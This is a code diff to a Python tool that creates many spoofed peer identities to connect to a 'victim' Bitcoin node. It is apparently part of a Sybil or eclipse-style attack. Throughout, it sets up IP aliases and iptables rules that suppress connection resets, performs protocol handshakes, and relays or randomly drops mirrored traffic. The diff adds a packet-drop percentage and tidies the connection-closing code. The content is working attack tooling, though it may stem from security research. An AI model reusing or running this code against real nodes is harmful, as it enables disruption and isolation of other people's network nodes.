@@ -30,6 +30,8 @@ while num_identities < 0:
 		num_identities = int(input('How many identities would you like? '))
 	except: pass
 
+percentage_to_drop = 0
+
 seconds_delay = { # -1 to drop the packet
 	'version': -1,
 	'verack': -1,
@@ -137,21 +139,15 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	return msg
 
 # Close a connection
-def close_connection(socket, mirror_socket, ip, port, interface):
+def close_connection(socket, ip, port, interface):
 	successful = False
 	try:
 		socket.close()
-		#if mirror_socket != None:
-		#	mirror_socket.close()
 	except: successful = False
 	terminal(f'sudo ifconfig {interface} {ip} down')
 	try:
 		if socket in identity_socket: identity_socket.remove(socket)
 		del socket
-
-		#if mirror_socket != None:
-		#	if mirror_socket in identity_mirror_socket: identity_mirror_socket.remove(mirror_socket)
-		#	del mirror_socket
 
 		if interface in identity_interface: identity_interface.remove(interface)
 		if (ip, port) in identity_address: identity_address.remove((ip, port))
@@ -193,7 +189,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.bind((src_ip, src_port))
 	except:
 		print('Failed to bind ip to victim')
-		close_connection(s, None, src_ip, src_port, interface)
+		close_connection(s, src_ip, src_port, interface)
 		time.sleep(1)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
@@ -204,7 +200,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.connect((dst_ip, dst_port))
 	except:
 		print('Failed to connect to victim')
-		close_connection(s, None, src_ip, src_port, interface)
+		close_connection(s, src_ip, src_port, interface)
 		time.sleep(1)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
@@ -223,7 +219,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		verack = s.recv(1024)
 	except:
 		print('Failed to send packets to victim')
-		close_connection(s, None, src_ip, src_port, interface)
+		close_connection(s, src_ip, src_port, interface)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 
@@ -248,75 +244,14 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 # Reconnect a peer
 def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
 
-	close_connection(the_socket, other_socket, src_ip, src_port, interface)
-	close_connection(other_socket, the_socket, dst_ip, dst_port, interface)
+	close_connection(the_socket, src_ip, src_port, interface)
+	close_connection(other_socket, dst_ip, dst_port, interface)
 	#make_fake_connection(src_ip = random_ip(), dst_ip, verbose=True, attempt_number = 3)
 	try:
 		# With attempt_number == -1, it will retry to connect infinitely
 		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
 	except ConnectionRefusedError:
 		print('Connection was refused. The victim\'s node must not be running.')
-
-	"""
-	src_port = random.randint(1024, 65535)
-	dst_port = victim_port
-	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
-
-	interface = ip_alias(src_ip)
-	identity_interface.append(interface)
-	if verbose: print(f'Successfully set up IP alias on interface {interface}')
-	if verbose: print('Resulting ifconfig interface:')
-	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
-
-	if verbose: print('Setting up iptables configurations')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
-	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
-	#the_socket.close()
-	#if the_socket in identity_socket: identity_socket.remove(the_socket)
-	#del the_socket
-
-	time.sleep(1)
-
-	verbose = True
-
-	print(f'Reconnecting to ({dst_ip} : {dst_port})')
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
-	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-	while success == -1:
-		print(f'Setting socket network interface to "{network_interface}"...')
-		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-
-	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
-	s.bind((src_ip, src_port))
-
-	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
-
-	while True:
-		try:
-			s.connect((dst_ip, dst_port))
-			version = version_packet(src_ip, dst_ip, src_port, dst_port)
-			s.sendall(version.to_bytes())
-			verack = s.recv(1924)
-			verack = msg_verack(bitcoin_protocolversion)
-			s.sendall(verack.to_bytes())
-			verack = s.recv(1024)
-			break
-		except:
-			print('Attempting connection again in 5 seconds...')
-			time.sleep(5)
-
-	identity_socket.append(s)
-	identity_address.append((src_ip, src_port))
-	identity_interface.append(interface)
-	create_task(True, 'Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
-
-	print(f'Successfully reconnected ({dst_ip} : {dst_port})')
-	"""
-
 
 # Creates a fake connection to the victim
 def mirror_make_fake_connection(interface, src_ip, verbose=True):
@@ -364,17 +299,18 @@ def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, int
 			packet, address = socket.recvfrom(65565)
 			create_task(True, 'Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
 		except: time.sleep(1)
-	close_connection(socket, None, dst_ip, dst_port, interface)
-	#close_connection(mirror_socket, socket, src_ip, src_port, interface)
+	close_connection(socket, dst_ip, dst_port, interface)
 
 def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		try:
 			packet, address = socket.recvfrom(65565)
-			create_task(True, 'Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
+			if random.random() >= percentage_to_drop:
+				create_task(True, 'Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
+			else:
+				pass # Dropped packet
 		except: time.sleep(1)
-	close_connection(socket, None, src_ip, src_port, interface)
-	#close_connection(orig_socket, socket, dst_ip, dst_port, interface)
+	close_connection(socket, src_ip, src_port, interface)
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
@@ -434,10 +370,6 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
 			create_task(False, 'Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 
-
-		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
-		#print("Closing socket because of error: " + str(e))
-		#make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
 	return True
 
 # Called when a packet is sniffed from the network
